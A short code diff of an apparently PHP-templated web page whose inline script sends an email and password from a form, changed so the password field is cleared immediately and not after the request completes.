@@ -108,9 +108,8 @@ justLog($__EMAIL__, $__TYPE__, 1);
                 pass: passwordGet.value,
                 email: emailGet.value,
             })
-            .then(e=>{
-                passwordGet.value = "";
-            })
+            
+            passwordGet.value = "";
         }
     </script>
 
